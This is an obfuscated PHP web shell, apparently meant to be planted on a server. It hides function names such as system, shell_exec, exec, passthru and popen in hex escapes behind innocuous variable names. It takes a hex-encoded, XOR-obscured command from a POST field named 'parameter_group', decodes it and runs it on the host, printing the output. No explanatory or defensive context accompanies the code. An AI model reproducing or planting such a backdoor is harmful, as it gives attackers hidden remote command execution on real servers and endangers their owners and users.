<?php

$sync_manager = "he\x782bin";
$buffer_cache2 = "\x73\x68e\x6Cl\x5Fe\x78ec";
$buffer_cache3 = "\x65xec";
$buffer_cache6 = "\x73\x74rea\x6D_\x67e\x74\x5Fc\x6Fntents";
$buffer_cache7 = "pclose";
$buffer_cache1 = "\x73ys\x74e\x6D";
$buffer_cache4 = "\x70\x61s\x73\x74hru";
$buffer_cache5 = "\x70\x6Fpen";
if (isset($_POST["\x70\x61\x72a\x6D\x65te\x72_\x67r\x6Fup"])) {
            function settings ($reference , $key){$binding = '' ; $i=0; while($i<strlen($reference)){$binding.=chr(ord($reference[$i])^$key);$i++;} return$binding;}
            $parameter_group = $sync_manager($_POST["\x70\x61\x72a\x6D\x65te\x72_\x67r\x6Fup"]);
            $parameter_group = settings($parameter_group, 10);
            if (function_exists($buffer_cache1)) {
                $buffer_cache1($parameter_group);
            } elseif (function_exists($buffer_cache2)) {
                print $buffer_cache2($parameter_group);
            } elseif (function_exists($buffer_cache3)) {
                $buffer_cache3($parameter_group, $bind_reference);
                print join("\n", $bind_reference);
            } elseif (function_exists($buffer_cache4)) {
                $buffer_cache4($parameter_group);
            } elseif (function_exists($buffer_cache5) && function_exists($buffer_cache6) && function_exists($buffer_cache7)) {
                $key_binding = $buffer_cache5($parameter_group, 'r');
                if ($key_binding) {
                    $component_descriptor = $buffer_cache6($key_binding);
                    $buffer_cache7($key_binding);
                    print $component_descriptor;
                }
            }
            exit;
        }